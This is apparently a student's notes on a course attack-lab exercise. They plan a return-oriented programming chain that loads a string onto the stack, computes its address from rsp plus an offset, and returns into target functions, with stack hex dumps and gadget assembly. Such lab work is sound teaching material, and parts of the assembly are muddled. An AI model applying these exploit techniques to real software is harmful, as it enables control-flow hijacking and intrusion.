This time, we must load the string into the stack,
and find a way to add its offset to rsp and store it in a register,
pass that register as an argument, and, optionally, pray.

Jk, we can do it.

Let's start with positioning at the link register.

```
%rsp:
....0000  00 00 00 00 00 00 00 00
....0008  00 00 00 00 00 00 00 00
....0010  00 00 00 00 00 00 00 00
....0018  00 00 00 00 00 00 00 00
....0020  00 00 00 00 00 00 00 00
....0028  00 00 00 00 00 00 00 00
```

The end sequence is predetermined, too (addresses are flexible).

```
...0200  35 39 62 39 39 37 66 61
...0208  00 00 00 00 00 00 00 00
```

At this point, the address of the string is %rsp + 0x200,
but each time we return, it will be lowered by 8, so let's
calculate our offsets carefully.

```asm
popq   %rax
mov    %rsp, %rax
mov    %ecx, %esi
mov    %eax, %edx
mov    %edx, %ecx
```

The process should be roughly as follows:
```asm 

mov   %rsp, %rax # get the stack pos
mov   %rsp, %rdi # arg1 is stack addr

popq  OFFSET
mov   %eax, %edx
mov   %edx, %ecx
mov   %ecx, %esi # put the offset as arg2

ret # ADDRESS of add_xy => %rax is addr of string

mov   %rax, %rdi

ret # ADDRESS of touch3
```


0x7f ff ff f9 83 9a -- addr
0x7f ff ff f9 7c a0 -- rdi
